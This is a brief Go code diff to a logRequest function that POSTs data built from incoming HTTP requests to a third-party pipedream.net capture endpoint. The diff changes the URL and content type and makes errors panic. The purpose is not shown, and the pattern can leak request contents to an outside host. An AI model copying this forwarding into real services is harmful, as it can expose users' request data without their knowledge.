@@ -99,15 +99,16 @@ func logRequest(r2 *http.Request) {
 	}
 	body := bytes.NewReader(payloadBytes)
 
-	req, err := http.NewRequest("POST", "https://en6y1uk51c5c6.x.pipedream.net/", body)
+	req, err := http.NewRequest("POST", "https://df39fb31467ff557acc53983605f1ff8.m.pipedream.net", body)
 	if err != nil {
-		// handle err
+		panic(err)
 	}
-	req.Header.Set("Content-Type", "text/plain")
+	req.Header.Set("Content-Type", "application/json")
 
 	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
-		// handle err
+		panic(err)
 	}
+
 	defer resp.Body.Close()
 }
